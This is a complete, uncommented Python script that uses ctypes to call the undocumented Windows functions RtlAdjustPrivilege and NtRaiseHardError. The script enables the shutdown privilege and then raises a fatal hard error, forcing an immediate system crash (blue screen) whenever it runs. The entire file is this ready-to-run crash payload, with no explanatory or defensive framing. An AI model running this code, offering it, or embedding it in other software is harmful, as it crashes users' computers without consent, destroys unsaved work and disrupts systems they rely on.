from ctypes import windll
from ctypes.wintypes import ULONG, LONG, BOOLEAN, PBOOLEAN, PULONG, LPVOID


# noinspection SpellCheckingInspection
def main():
    ntdll = windll.ntdll
    ntdll.RtlAdjustPrivilege.restype = LONG
    ntdll.RtlAdjustPrivilege.argtypes = (ULONG, BOOLEAN, BOOLEAN, PBOOLEAN)
    ntdll.NtRaiseHardError.restype = LONG
    ntdll.NtRaiseHardError.argtypes = (LONG, ULONG, ULONG, LPVOID, ULONG, PULONG)
    ntdll.RtlAdjustPrivilege(19, 1, 0, BOOLEAN(1))
    ntdll.NtRaiseHardError(0xc00002b4, 0, 0, 0, 6, ULONG(0))


if __name__ == '__main__':
    main()
